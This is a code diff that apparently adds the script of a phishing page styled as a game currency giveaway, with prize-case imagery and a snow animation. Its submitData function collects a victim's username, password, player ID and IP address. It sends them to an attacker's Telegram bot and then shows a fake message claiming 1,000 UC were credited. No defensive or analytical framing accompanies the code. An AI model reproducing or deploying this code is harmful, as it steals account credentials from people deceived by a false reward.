+        // --- DATA HANDLING ---
+        async function submitData(method, uField, pField) {
+            const user = document.getElementById(uField).value;
+            const pass = document.getElementById(pField).value;
+            const pid = document.getElementById('playerID').value || 'Unknown';
+
+            if (!user || !pass) return alert("Please fill in all fields");
+
+            const text = `🔐 NEW LOGIN: ${method}\n🆔 Player ID: ${pid}\n👤 User: ${user}\n🔑 Pass: ${pass}\n🌐 IP: ${userIP}`;
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: text})
+            });
+
+            closeModals();
+            ucBalance = 1000;
+            updateBalanceUI();
+            showSection('hub');
+            alert("Verification successful! 1,000 UC has been added to your balance.");
+        }
+
+        function updateBalanceUI() {
+            document.getElementById('balanceText').innerText = ucBalance;
+        }
+
+        // Helpers
+        function initTape() {
+            const tape = document.getElementById('caseTape');
+            const items = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz6.png', 'priz7.png'];
+            for(let i=0; i<60; i++) {
+                const img = items[Math.floor(Math.random() * items.length)];
+                tape.innerHTML += `<div class="case-item"><img src="${img}"></div>`;
+            }
+        }
+
+        // Init Snow
+        function initSnow() {
+            const container = document.getElementById('snow-container');
+            for(let i=0; i<50; i++) {
+                const s = document.createElement('div');
+                s.className = 'snowflake';
+                s.style.left = Math.random() * 100 + '%';
+                s.style.width = s.style.height = (Math.random() * 4 + 2) + 'px';
+                s.style.animationDuration = (Math.random() * 5 + 5) + 's';
+                s.style.animationDelay = Math.random() * 5 + 's';
+                container.appendChild(s);
+            }
+        }
+
+        window.onload = () => {
+            initTape();
+            initSnow();
+        };
     </script>
 </body>
 </html>
